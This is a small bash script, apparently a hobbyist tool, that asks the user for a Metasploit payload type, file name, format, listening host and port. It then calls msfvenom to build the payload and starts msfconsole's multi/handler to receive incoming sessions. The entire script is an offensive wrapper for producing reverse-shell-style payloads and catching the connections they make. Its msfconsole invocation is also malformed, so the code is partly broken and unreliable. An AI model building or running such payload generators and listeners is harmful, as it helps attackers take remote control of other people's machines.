#!/bin/bash
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
figlet PAYLOAD
echo -e "$green thank you for use my new tool        $red -_RAMI_ZEYRI_- $yellow"
echo "pleas wait a few seconds............/"
sleep 3
read -p "type of your payload : " plod
read -p "name of your payload : " payload
read -p "format file : " format
read -p "Lhost : " host
read -p "Lport : " port
read -p "Place of payload :  " place
echo "pleas wait a few secands............/"
sleep 3
xterm -e "msfvenom -p $plod Lhost=$host Lport=$port R> /root/$place/$payload.$format"
function r {
msfconsole -q -x "use multi/handler -p $plod -H $host -p $port -r run"
}
r
echo -e "$blue Returen again <3"

